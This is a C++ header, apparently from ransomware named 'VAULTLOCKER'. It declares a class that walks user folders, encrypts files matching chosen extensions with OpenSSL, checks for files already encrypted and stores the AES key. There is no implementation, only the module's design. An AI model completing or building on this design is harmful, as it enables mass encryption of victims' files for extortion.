
// VAULTLOCKER. 2024
// ENCRYPTOR.H
// HEADER FOR MAIN ENCRTPTION MODULE

#ifndef ENCRYPTOR_H
#define ENCRYPTOR_H

#include <string>
#include <vector>
#include <windows.h>
#include <openssl/evp.h>
#include <filesystem>
#include <Shlobj.h>

namespace fs = std::filesystem;

class Encryptor {
public:
    Encryptor();
    ~Encryptor();
    int RunEncryption();

private:
    void saveAESKeyToFile();
    std::vector<std::string> GetUserDirectories();
    void encryptFilesInDirectory(const std::string& directory, const std::vector<std::string>& extensions);
    bool isExtensionMatch(const std::string& filePath, const std::vector<std::string>& extensions);
    bool isAlreadyEncrypted(const std::string& filePath);
    void encryptFile(const std::string& inputFile, const std::string& outputFile);
    bool encryptionAlreadyPerformed(const std::vector<std::string>& directories);
    std::string GetKnownFolderPath(REFKNOWNFOLDERID folderId);

    unsigned char key[EVP_MAX_KEY_LENGTH];
    unsigned char iv[EVP_MAX_IV_LENGTH];
};

#endif // ENCRYPTOR_H
